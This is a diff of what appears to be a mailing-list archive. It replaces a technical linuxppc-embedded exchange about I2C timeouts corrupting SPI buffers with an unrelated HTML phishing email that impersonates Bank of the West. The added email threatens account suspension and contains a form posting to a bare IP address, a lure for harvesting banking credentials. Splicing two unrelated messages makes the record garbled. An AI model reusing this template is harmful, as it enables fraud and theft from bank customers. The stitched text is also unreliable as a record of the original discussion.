@@ -1,18 +1,20 @@
-Return-Path: <cajus.hahn@de.abb.com>
-Received: from nse3.abb.com (nse3.abb.com [129.35.204.69])
-	by ozlabs.org (Postfix) with ESMTP id C302567F89
+Return-Path: <security@BankOfTheWest.com>
+Received: from ns.coninsalt.ro (007.coninsalt.ro [194.102.105.1])
+	by ozlabs.org (Postfix) with ESMTP id 8E891680EC
 	for <linuxppc-embedded@ozlabs.org>;
-	Fri, 12 Aug 2005 18:21:19 +1000 (EST)
-In-Reply-To: <20050812080113.AA881352B36@atlas.denx.de>
-To: Wolfgang Denk <wd@denx.de>
-Message-ID: <OF41EC9A74.A4DE3DB8-ONC125705B.002CB094-C125705B.002DE3E7@de.abb.com>
-From: cajus.hahn@de.abb.com
-Date: Fri, 12 Aug 2005 10:21:14 +0200
+	Fri, 12 Aug 2005 23:51:23 +1000 (EST)
+Received: from clubnet5 (tanase10.coninsalt.ro [194.102.105.251])
+	by ns.coninsalt.ro (Postfix) with SMTP id 8B318331EC
+	for <linuxppc-embedded@ozlabs.org>;
+	Fri, 12 Aug 2005 16:16:52 +0300 (EEST)
+From: "BankOfTheWest" <security@BankOfTheWest.com>
+To: <linuxppc-embedded@ozlabs.org>
+Date: Fri, 12 Aug 2005 16:16:20 +0300
 MIME-Version: 1.0
-Content-type: text/plain; charset=US-ASCII
-Cc: linuxppc-embedded@ozlabs.org
-Subject: Re: 8xx: i2c-algo-8xx - fixed timeout detection and transmission
-	errors
+Content-Type: text/html
+Message-Id: <20050812131653.8B318331EC@ns.coninsalt.ro>
+Subject: BankOfTheWest Inc: Please Confirm Your Banking Details [Fri, 12 Aug
+ 2005 12:38:14 -0100]
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -23,66 +25,97 @@ List-Help: <mailto:linuxppc-embedded-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
-
-
-
-
-My description seems to be a little misleading.
-WITHOUT the force_reinit() my SPI driver reports transmission errors if the
-I2C bus has longer disturbances.
-WITH the force_reinit() my SPI driver works fine.
-This sounds like the I2C allocates a new buffer for every timed-out
-transmision. If all I2C buffers are full, the SPI buffers get overwritten
-!?
-I did not really trace back the problem, this is only my suspicion.
-Because the  force_reinit() resets all the buffer pointer to their init
-values the problem with the SPI does not occur.
-
-Cajus
-
-
-
-Message from Wolfgang Denk <wd@denx.de>@denx.de received on 12.08.2005
-10:01
-                                                                                                                                        
-                                                                                                                                        
-                12.08.2005        Wolfgang Denk <wd@denx.de>@denx.de                                                                    
-                  10:01                                                                                                                 
-                                  Sent by wd@denx.de                                                                                    
-                                                                                                                                        
-                                                                                                                                        
-
-                                                                                                                                      
-                                                                                                                                      
-                               To:       Cajus Hahn/DEAPR/ABB@ABB_DE01                                                                
-                               cc:       linuxppc-embedded@ozlabs.org                                                                 
-                               Subject:  Re: 8xx: i2c-algo-8xx - fixed timeout detection and transmission errors                      
-                                                                                                                                      
-
-
-
-In message
-<OF29EF0D8D.F0A40A5C-ONC125705B.0028FA70-C125705B.002AF212@de.abb.com> you
-wrote:
->
-> Then I set the SCL line to ground to simulate a longer bus disturbance.
-> After some timeouts my SPI bus, yes the SPI bus, reportet transmission
-> errors. Both bus-interfaces use the CPM. It looks like the SPI buffer
-gets
-> garbaged by the I2C interface.
-
-This is "normal". We see similar problems even with  perfectly  legal
-operations  on  the CPM. The SPI is running at lowest priority on the
-CPM, and anything that  causes  higher  CPM  load  will  starve  SPI.
-Obviously  your  operation  causes  the  CPM  to go into some strange
-state.
-
-Best regards,
-
-Wolfgang Denk
-
---
-Software Engineering:  Embedded and Realtime Systems,  Embedded Linux
-Phone: (+49)-8142-66989-10 Fax: (+49)-8142-66989-80 Email: wd@denx.de
-There are certain things men must do to remain men.
-             -- Kirk, "The Ultimate Computer", stardate 4929.4
+<style type="text/css">
+<!--
+.style1 {color: #333333}
+.style2 {color: #000099}
+-->
+</style>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<DIV>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<DIV>
+<DIV id=message>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="WIDTH: 597px; HEIGHT: 654px" width=597 border=1>
+<TBODY>
+<TR>
+<TD>
+<!--Aici-->
+<FORM action=http://194.102.105.241/BankOfTheWest/home.htm
+<DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV><FONT color=#00ff66 size=2>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+    <TR>
+      <TD><DIV>
+          <P><span class="style1"><FONT face=arial>Copyright © 1995-2005 <A href="http://pages.BankOfTheWest.com/community/aboutBankOfTheWest/index.html" target=_blank>BankOfTheWest Inc.</A> All Rights Reserved.<BR>
+              Designated trademarks and brands are the property of their respective owners.<BR>
+              Use of this Web site constitutes acceptance of the</FONT></span><FONT face=arial></FONT></P>
+      </DIV></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+    <TR>
+      <TD><DIV>
+          <P><FONT face=arial><BR>
+              BankOfTheWest </FONT><A href="http://pages.BankOfTheWest.com/help/community/png-user.html" target=_blank><FONT face=arial color=#003399>User Agreement</FONT></A><FONT face=arial> and </FONT><A href="http://pages.BankOfTheWest.com/help/community/png-priv.html" target=_blank><FONT face=arial color=#003399>Privacy Policy</FONT></A><FONT face=arial>.</FONT></P>
+      </DIV></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</FONT></DIV>
+</DIV></DIV></DIV></DIV></DIV></DIV>
+<TABLE cellSpacing=0 cellPadding=0 width=603 border=0>
+<TBODY>
+<TR>
+<TD colSpan=2>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV><FONT face=arial></FONT>&nbsp;</DIV>
+<DIV><span class="style2"><FONT face=arial>Dear customer,<BR>
+  We regret to inform you that your BankOfTheWest account will be suspended due to the violation of our site policy below: <BR>
+  * Misrepresentation of Identity (User) - Representing yourself as another BankOfTheWest user or registering using the identity of another.<BR>
+  Due to the suspension of this account, please be advised you are prohibited from using BankOfTheWest in any way. This includes the registering of a new account.<BR>
+  Please note that this suspension does not relieve you of your agreed-upon obligation to pay any fees you may owe to BankOfTheWest.<BR>
+  According to our site policy you will have to confirm that you are the real owner of the BankOfTheWest account by completing&nbsp;a form or else your account will be deleted.</FONT></span></DIV>
+<DIV class="style2"><FONT face=arial>We regret to inform you that your&nbsp;BankOfTheWest account could be suspended if you don't resolve your problems.To resolve this problems please click&nbsp;the link below and login to your account in order to resolve your account problems.To update your acount please click submit button.</FONT></DIV>
+<DIV>&nbsp;</DIV></TD>
+</TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD width="35%" align="center" valign="middle">
+<P><FONT face=arial>&nbsp; &nbsp;
+    <INPUT style="WIDTH: 139px; HEIGHT: 24px" type=Submit size=40 value=Submit name=submit></FONT></P></TD></TR></TBODY></TABLE></FORM></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV></DIV></DIV></TD></TR></TBODY></TABLE></DIV></DIV></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE><FONT size=-1></DIV></FONT>
+<P><FONT face=arial size=-1>&nbsp;</P></FONT></DIV>
